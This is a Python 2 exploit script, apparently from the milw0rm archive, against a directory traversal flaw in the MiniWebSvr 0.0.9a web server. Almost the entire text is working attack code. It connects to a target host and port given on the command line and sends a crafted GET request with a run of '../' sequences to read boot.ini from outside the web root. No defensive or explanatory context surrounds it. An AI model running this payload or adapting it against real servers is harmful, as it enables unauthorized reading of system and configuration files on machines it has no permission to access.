import socket
import sys

print '---------------------------------------------------------'
print 'MiniWebSvr 0.0.9a Directory Transversal Vulnerability'
print 'Project URL: http://miniwebsvr.sourceforge.net/'
print 'Author: gbr'
print 'Tested on Windows XP SP2'
print '---------------------------------------------------------'

host = "127.0.0.1"
port = 8080

if sys.argv[1:]:
        host = sys.argv[1]
        if sys.argv[2:]:
                port = int(sys.argv[2])

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send("GET /%../../../../../../../../../../../boot.ini HTTP/1.0\r\n\r\n")
        while True:
                data = s.recv(4096)
                if not data:
                        break
                print data

except:
        print "Connection Error"

# milw0rm.com [2008-03-03]
